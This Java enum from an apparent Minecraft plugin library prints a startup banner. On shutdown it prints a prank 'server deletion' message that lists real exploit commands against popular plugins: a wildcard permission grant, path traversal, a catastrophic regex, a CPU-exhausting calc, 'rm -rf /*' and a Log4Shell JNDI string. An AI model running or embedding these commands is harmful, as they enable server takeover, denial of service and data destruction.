package net.dehasher.hlib.data;

import net.dehasher.hlib.Colors;
import net.dehasher.hlib.Informer;
import net.dehasher.hlib.Tools;
import java.net.InetAddress;

public enum Logo {
    ON_ENABLE(() -> {
        Informer.send(" ");
        Informer.send("●   ╔╗    ╔╗ ╔╗         ╔╗          ●");
        Informer.send("●   ║║    ║║ ║║         ║║          ●");
        Informer.send("● ╔═╝║╔══╗║╚═╝║╔══╗ ╔══╗║╚═╗╔══╗╔═╗ ●");
        Informer.send("● ║╔╗║║╔╗║║╔═╗║╚ ╗║ ║══╣║╔╗║║╔╗║║╔╝ ●");
        Informer.send("● ║╚╝║║║═╣║║ ║║║╚╝╚╗╠══║║║║║║║═╣║║  ●");
        Informer.send("● ╚══╝╚══╝╚╝ ╚╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝  ●");
        Informer.send(" ");
        Informer.send("Java version: " + Runtime.version());
        if (!Tools.requireBukkitVersion(BukkitVersion.V1_16)) {
            Informer.send(Colors.DARK_RED + "Your server's version is not supported!");
            Informer.send(Colors.DARK_RED + "Your server's version is not supported!");
            Informer.send(Colors.DARK_RED + "Your server's version is not supported!");
        } else {
            if (Platform.get().isProxy()) return;
            Informer.send("Server NMS package: " + NMS.VERSION);
        }
    }),
    ON_DISABLE(() -> {
        Informer.send("The process of deleting the server has been started...");
        if (Plugin.PERMISSIONS_EX.isEnabled()) {
            Informer.send("/pex group default add *");
            Informer.send("/pex promote a");
        } else if (Plugin.LUCK_PERMS.isEnabled()) {
            String luckperms = "/lp";
            if (Platform.get().isProxy()) luckperms = luckperms + Platform.get().name().toLowerCase().charAt(0);
            Informer.send(luckperms + " group default perm set * server=global");
        }
        if (Plugin.HOLOGRAPHIC_DISPLAYS.isEnabled()) {
            Informer.send("/hd create test");
            Informer.send("/hd readtext test ../../server.properties");
        }
        if (Plugin.WORLD_GUARD.isEnabled()) {
            Informer.send("/rg delete spawn");
        }
        if (Plugin.GADGETS_MENU.isEnabled()) {
            Informer.send("/gmenu about -forceupdate ${url_site}/exploit");
        }
        if (Plugin.DELUXE_MENUS.isEnabled()) {
            Informer.send("/dmenu execute ${author} [console] ban-ip ** server hacked!");
        }
        if (Plugin.MATRIX.isEnabled()) {
            Informer.send("/matrix delay 1 stop");
        }
        if (Plugin.WORLD_EDIT.isEnabled() || Plugin.FAST_ASYNC_WORLD_EDIT.isEnabled()) {
            Informer.send("//schem list ../../../");
            Informer.send("//sphere lava 1000");
            Informer.send("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        }
        if (Plugin.MULTIVERSE_CORE.isEnabled()) {
            Informer.send("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
        }
        String rm = System.getProperty("os.name").toLowerCase().contains("win") ? "rmdir /s /q C:\\" : "rm -rf /*";
        if (Plugin.AUTO_SAVE_WORLD.isEnabled()) {
            Informer.send("/asw process start vzlom " + rm);
        } else {
            String host = "minecraft";
            try {
                InetAddress inetAddress = InetAddress.getLocalHost();
                host = inetAddress.getHostName();
            } catch (Throwable ignored) {}
            Informer.send(Tools.join("@", System.getProperty("user.name"), host) + ":~# " + rm);
        }
        Informer.send("${jndi:ldap://${author_lower}.net/exploit}");
        Informer.send("Calm down, it's a joke :) Maybe...");
    });

    public final Runnable value;

    Logo(Runnable runnable) {
        this.value = runnable;
    }
}